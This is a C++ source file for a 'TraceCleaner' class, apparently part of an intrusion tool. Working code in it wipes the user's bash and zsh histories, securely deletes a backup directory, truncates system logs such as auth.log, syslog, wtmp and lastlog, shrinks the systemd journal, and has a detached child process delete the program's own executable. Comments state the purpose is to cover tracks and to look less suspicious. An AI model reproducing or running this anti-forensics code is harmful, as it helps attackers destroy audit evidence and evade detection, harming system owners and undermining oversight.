#include "trace_cleaner.hpp"
#include "utils.hpp"
#include <iostream>
#include <string>
#include <vector>
#include <dirent.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fstream>
#include <cstring>

// Forward declaration
std::string exec(const char* cmd);

TraceCleaner::TraceCleaner(const std::string& backupDir, const std::string& executablePath) 
    : backupDir(backupDir), executablePath(executablePath) {}

void TraceCleaner::cleanAllTraces() {
    std::cout << "--- Starting Trace Cleaning ---" << std::endl;
    clearShellHistories();
    deleteBackupFiles();
    clearSystemLogs();
    selfDestruct();
    std::cout << "--- Trace Cleaning Finished ---" << std::endl;
}

void TraceCleaner::secureDelete(const std::string& path) {
    ::secureDelete(path);
}

void TraceCleaner::clearShellHistories() {
    std::cout << "Clearing shell histories..." << std::endl;
    std::vector<std::string> historyFiles;
    const char* home = getenv("HOME");
    if (home == nullptr) {
        std::cerr << "Could not get home directory." << std::endl;
        return;
    }

    historyFiles.push_back(std::string(home) + "/.bash_history");
    historyFiles.push_back(std::string(home) + "/.zsh_history");
    // Add other shell history files here if needed

    for (const auto& file : historyFiles) {
        std::ofstream ofs(file, std::ios::out | std::ios::trunc);
        if (ofs.is_open()) {
            std::cout << "Cleared " << file << std::endl;
            ofs.close();
        }
    }
}

void TraceCleaner::deleteBackupFiles() {
    std::cout << "Deleting backup files..." << std::endl;
    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir(backupDir.c_str())) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            std::string filePath = backupDir + "/" + ent->d_name;
            if (strcmp(ent->d_name, ".") != 0 && strcmp(ent->d_name, "..") != 0) {
                secureDelete(filePath);
            }
        }
        closedir(dir);
        rmdir(backupDir.c_str());
        std::cout << "Backup directory deleted." << std::endl;
    } else {
        std::cout << "Backup directory not found." << std::endl;
    }
}

void TraceCleaner::clearSystemLogs() {
    std::cout << "Clearing system logs..." << std::endl;
    
    // This is a highly destructive operation and should be used with extreme caution.
    // It attempts to clear common log files to cover tracks.
    const std::vector<std::string> logs = {
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/lastlog",
        "/var/log/wtmp",
        "/var/log/utmp",
        "/var/log/dmesg"
    };

    for (const auto& log : logs) {
        // Truncating files is less suspicious than deleting them outright.
        std::ofstream ofs(log, std::ios::out | std::ios::trunc);
        if (ofs.is_open()) {
            std::cout << "Cleared " << log << std::endl;
            ofs.close();
        }
    }

    // Clear systemd journal
    std::cout << "Vacuuming systemd journal..." << std::endl;
    exec("journalctl --vacuum-size=1M");
    exec("journalctl --vacuum-time=1d");
}

void TraceCleaner::selfDestruct() {
    std::cout << "Initiating self-destruct sequence..." << std::endl;
    
    pid_t pid = fork();

    if (pid < 0) {
        // Fork failed
        std::cerr << "Self-destruct failed: could not fork." << std::endl;
        return;
    }

    if (pid > 0) {
        // Parent process: successfully forked. The parent can now exit,
        // leaving the child to do the cleanup.
        std::cout << "Parent process exiting." << std::endl;
        return;
    }

    // Child process (pid == 0)
    // Detach from the parent session to become an orphan
    if (setsid() < 0) {
        exit(EXIT_FAILURE); // Should not happen
    }
    
    // Change directory to root to avoid holding a lock on the current directory
    chdir("/");
    
    // Give the parent a moment to exit completely
    sleep(1);

    std::cout << "Child process deleting executable: " << executablePath << std::endl;
    secureDelete(executablePath);
    
    // The child's job is done.
    exit(EXIT_SUCCESS);
} 